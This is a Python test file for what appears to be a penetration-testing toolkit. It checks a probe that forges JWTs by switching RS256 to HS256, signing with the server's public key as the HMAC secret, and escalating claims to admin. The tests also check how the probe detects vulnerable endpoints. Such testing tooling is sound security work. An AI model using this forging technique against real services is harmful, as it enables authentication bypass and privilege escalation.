import base64
import hashlib
import hmac
import json

from tradecraft.adapters.jwt_algorithm_confusion_probe import execute as confusion_execute
from tradecraft.adapters.jwt_algorithm_confusion_probe import parse as confusion_parse

PUBLIC_KEY_PEM = "-----BEGIN PUBLIC KEY-----\r\nMIIBIjANBgkqhkiG9w0B...\r\n-----END PUBLIC KEY-----\r\n"


def _b64url_decode(segment: str) -> bytes:
    padded = segment + "=" * ((4 - len(segment) % 4) % 4)
    return base64.urlsafe_b64decode(padded.encode("ascii"))


def test_forge_hs256_confusion_tokens_signs_with_public_key_as_hmac_secret():
    header = {"alg": "RS256", "typ": "JWT"}
    payload = {"sub": "123", "user": "john", "role": "user", "admin": False}

    exact, normalized = confusion_execute.forge_hs256_confusion_tokens(header, payload, PUBLIC_KEY_PEM)
    assert exact != normalized  # different key bytes signed over -> different signature

    for token, key_str in ((exact, PUBLIC_KEY_PEM), (normalized, PUBLIC_KEY_PEM.replace("\r\n", "\n"))):
        h_b64, p_b64, sig_b64 = token.split(".")
        header_decoded = json.loads(_b64url_decode(h_b64))
        payload_decoded = json.loads(_b64url_decode(p_b64))
        assert header_decoded["alg"] == "HS256"
        # Privilege-escalation heuristic applied, same as jwt_analyze's.
        assert payload_decoded["role"] == "admin"
        assert payload_decoded["admin"] is True
        assert payload_decoded["user"] == "admin"

        expected_sig = hmac.new(key_str.encode("utf-8"), f"{h_b64}.{p_b64}".encode("ascii"), hashlib.sha256).digest()
        assert _b64url_decode(sig_b64) == expected_sig

    # Original dicts must not be mutated.
    assert header["alg"] == "RS256"
    assert payload["role"] == "user"
    assert payload["admin"] is False


def test_forge_hs256_confusion_tokens_identical_when_pem_already_lf_only():
    header = {"alg": "RS256"}
    payload = {"sub": "123"}
    lf_only_pem = PUBLIC_KEY_PEM.replace("\r\n", "\n")
    exact, normalized = confusion_execute.forge_hs256_confusion_tokens(header, payload, lf_only_pem)
    assert exact == normalized


def test_decode_jwt_claims_reexported_from_jwt_analyze():
    # Confirms the reuse wiring: decode_jwt_claims is jwt_analyze's own
    # function, not a local reimplementation.
    from tradecraft.adapters.jwt_analyze.execute import decode_jwt_claims as original
    assert confusion_execute.decode_jwt_claims is original


def test_parse_result_reexported_from_jwt_analyze():
    from tradecraft.adapters.jwt_analyze.parse import parse_result as original
    assert confusion_parse.parse_result is original
    assert confusion_parse.parse_result(401, 200)["vulnerable"] is True
    assert confusion_parse.parse_result(200, 200)["vulnerable"] is False
